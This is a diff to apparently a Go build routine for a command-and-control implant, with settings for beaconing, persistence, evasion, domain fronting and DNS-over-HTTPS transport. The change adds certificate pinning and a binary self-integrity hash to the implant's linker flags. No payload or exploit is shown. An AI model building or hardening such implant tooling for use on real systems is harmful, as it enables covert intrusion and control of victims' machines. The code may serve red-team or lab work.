@@ -72,7 +72,7 @@ func buildLdflags(cfg ImplantConfig, profile MalleableProfile, goos string) stri
 		transport = "http"
 	}
 
-	return fmt.Sprintf(prefix+` -X "main.C2URL=%s" -X "main.IntervalStr=%d" -X "main.JitterStr=%d" -X "main.UserAgent=%s" -X "main.PersistStr=%s" -X "main.SkipTLSVerifyStr=%s" -X "main.Protocol=%s" -X "main.DebugStr=%s" -X "main.BeaconURIStr=%s" -X "main.BeaconMethodStr=%s" -X "main.ListenerIDStr=%s" -X "main.P2PMode=%s" -X "main.P2PParent=%s" -X "main.P2PListenAddr=%s" -X "main.DNSDomain=%s" -X "main.DNSServer=%s" -X "main.DNSDoHURL=%s" -X "main.DNSDoTAddr=%s" -X "main.ProxyStr=%s" -X "main.CryptoKeyStr=%s" -X "main.ExpiryDateStr=%s" -X "main.EvasionStr=%s" -X "main.DomainFront=%s" -X "main.WorkingStartStr=%s" -X "main.WorkingEndStr=%s" -X "main.WorkingTZStr=%s" -X "main.BeaconTransportStr=%s" -X "main.SSHUserStr=%s" -X "main.SSHPasswordStr=%s" -X "main.SSHKeyStr=%s" -X "main.SSHHostKeyStr=%s"`,
+	return fmt.Sprintf(prefix+` -X "main.C2URL=%s" -X "main.IntervalStr=%d" -X "main.JitterStr=%d" -X "main.UserAgent=%s" -X "main.PersistStr=%s" -X "main.SkipTLSVerifyStr=%s" -X "main.Protocol=%s" -X "main.DebugStr=%s" -X "main.BeaconURIStr=%s" -X "main.BeaconMethodStr=%s" -X "main.ListenerIDStr=%s" -X "main.P2PMode=%s" -X "main.P2PParent=%s" -X "main.P2PListenAddr=%s" -X "main.DNSDomain=%s" -X "main.DNSServer=%s" -X "main.DNSDoHURL=%s" -X "main.DNSDoTAddr=%s" -X "main.ProxyStr=%s" -X "main.CryptoKeyStr=%s" -X "main.ExpiryDateStr=%s" -X "main.EvasionStr=%s" -X "main.DomainFront=%s" -X "main.WorkingStartStr=%s" -X "main.WorkingEndStr=%s" -X "main.WorkingTZStr=%s" -X "main.BeaconTransportStr=%s" -X "main.SSHUserStr=%s" -X "main.SSHPasswordStr=%s" -X "main.SSHKeyStr=%s" -X "main.SSHHostKeyStr=%s" -X "main.PinnedCertSHA256Str=%s" -X "main.SelfCheckSHA256Str=%s"`,
 		escape(cfg.C2URL),
 		cfg.Interval,
 		cfg.Jitter,
@@ -104,6 +104,8 @@ func buildLdflags(cfg ImplantConfig, profile MalleableProfile, goos string) stri
 		escape(cfg.SSHPassword),
 		escape(cfg.SSHKey),
 		escape(cfg.SSHHostKey),
+		escape(cfg.PinnedCertSHA256),
+		escape(cfg.SelfCheckSHA256),
 	)
 }
 
@@ -447,6 +449,8 @@ type ImplantConfig struct {
 	SSHPassword     string
 	SSHKey          string // base64 PEM client private key
 	SSHHostKey      string // base64 server host public key pin (empty = lab insecure)
+	PinnedCertSHA256  string // SHA-256 hex of server DER cert for pinning (empty = disabled)
+	SelfCheckSHA256   string // SHA-256 hex of the binary itself for integrity verification (empty = disabled)
 }
 
 // forgeC2ModuleReplace returns a `replace` directive for the local
